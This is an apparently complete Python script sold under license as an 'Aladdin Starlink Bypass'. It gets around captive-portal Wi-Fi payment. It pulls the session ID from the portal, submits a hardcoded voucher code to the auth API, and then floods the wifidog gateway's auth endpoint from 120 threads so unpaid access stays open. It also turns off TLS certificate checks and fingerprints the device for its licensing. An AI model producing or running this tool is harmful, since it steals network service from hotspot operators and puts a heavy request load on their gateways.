import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# --- SSL Error & Warnings Bypass ---
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION (ဒီနေရာမှာ Link ကို ပြောင်းရုံပါပဲ) ---
KEY_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Aladdin/refs/heads/main/key.txt"
LICENSE_FILE = ".aladdin_v11.lic"
ID_STORAGE = ".device_id"

def get_hwid():
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()

    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not serial:
            import uuid
            serial = str(uuid.getnode())
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"TRB-{raw_hash}"
    except:
        new_id = f"TRB-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"

    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
    return new_id

def banner():
    os.system('clear')
    print("\033[93m" + " ="*35)
    print("\033[96m" + """
      █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗
     ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║
     ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║
     ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║
     ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║
     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
    """)
    print("\033[95m" + "        ✨ Aladdin Starlink Bypass - IMMORTAL V11 ✨")
    print("\033[93m" + " ="*35 + "\033[0m\n")

def save_license(hwid, key, expiry):
    data = {"id": hwid, "key": key, "expiry": expiry}
    with open(LICENSE_FILE, "w") as f:
        json.dump(data, f)

def load_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                return json.load(f)
        except:
            return None
    return None

def background_verify(hwid, current_key):
    """ နောက်ကွယ်ကနေ Online စစ်မယ်၊ မမှန်ရင် License ဖျက်ပြီး ပိတ်မယ် """
    try:
        # Cache မကျအောင် URL အနောက်မှာ Random string ထည့်တောင်းမယ်
        anti_cache_url = f"{KEY_URL}?v={random.randint(1000, 9999)}"
        response = requests.get(anti_cache_url, timeout=10, verify=False).text
        lines = response.splitlines()
        
        found = False
        for line in lines:
            if "|" in line:
                db_id, db_key, db_date = line.split("|")
                if db_id.strip() == hwid and db_key.strip() == current_key:
                    expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
                    if datetime.now() < expiry_date:
                        # ရက်စွဲအသစ်ကို update လုပ်ပေးမယ် (ဥပမာ Admin က သက်တမ်းတိုးပေးလိုက်ရင်)
                        save_license(hwid, current_key, db_date.strip())
                        found = True
                        break
        
        if not found:
            if os.path.exists(LICENSE_FILE):
                os.remove(LICENSE_FILE)
            print("\n\033[91m[!] LICENSE INVALID OR EXPIRED. PLEASE CONTACT ADMIN.\033[0m")
            os._exit(1)
    except:
        pass # Internet မရှိရင် Offline တိုင်း ဆက်သွားမယ်

def online_verify(hwid, input_key):
    print("\033[93m[*] Verifying license online...\033[0m")
    try:
        anti_cache_url = f"{KEY_URL}?v={random.randint(1000, 9999)}"
        response = requests.get(anti_cache_url, timeout=10, verify=False).text
        lines = response.splitlines()
        
        for line in lines:
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 3:
                    db_id, db_key, db_date = parts
                    if db_id.strip() == hwid and db_key.strip() == input_key:
                        expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
                        if datetime.now() < expiry_date:
                            save_license(hwid, input_key, db_date.strip())
                            print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_date}\033[0m")
                            time.sleep(2)
                            return True
        print("\033[91m[!] INVALID KEY OR DEVICE NOT REGISTERED.\033[0m")
        return False
    except:
        print("\033[91m[!] CONNECTION ERROR: Check your internet for first-time setup.\033[0m")
        return False

def check_license():
    hwid = get_hwid()
    banner()
    
    local_data = load_license()
    # ၁။ Offline အရင် စစ်ကြည့်မယ်
    if local_data and local_data.get("id") == hwid:
        expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y")
        if datetime.now() < expiry_date:
            print(f"\033[92m[✓] AUTO-LOGIN SUCCESS! (Offline Mode)\033[0m")
            print(f"\033[94m[*] EXPIRY: {local_data['expiry']}\033[0m")
            # နောက်ကွယ်ကနေ Online နဲ့ တိုက်စစ်ခိုင်းထားမယ်
            threading.Thread(target=background_verify, args=(hwid, local_data.get("key")), daemon=True).start()
            time.sleep(1.5)
            return True

    # ၂။ Offline မရှိရင် Online တောင်းမယ်
    print(f"\033[94m[*] YOUR DEVICE ID: {hwid}\033[0m")
    input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()
    return online_verify(hwid, input_key)

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] Aladdin Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except:
            time.sleep(1)
            break

def start_immortal():
    if not check_license():
        return

    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] Aladdin Force Scanning Portal...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print("\033[95m[*] ⚡ Launching High-Speed Stable Threads ⚡\033[0m")
                for _ in range(120):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                while True:
                    if not check_net():
                        print("\033[91m[!] Connection Lost! Re-injecting...\033[0m")
                        break
                    time.sleep(5)
            else:
                time.sleep(2)
        except:
            time.sleep(2)

if __name__ == "__main__":
    try:
        start_immortal()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Script Stopped by User.\033[0m")
            
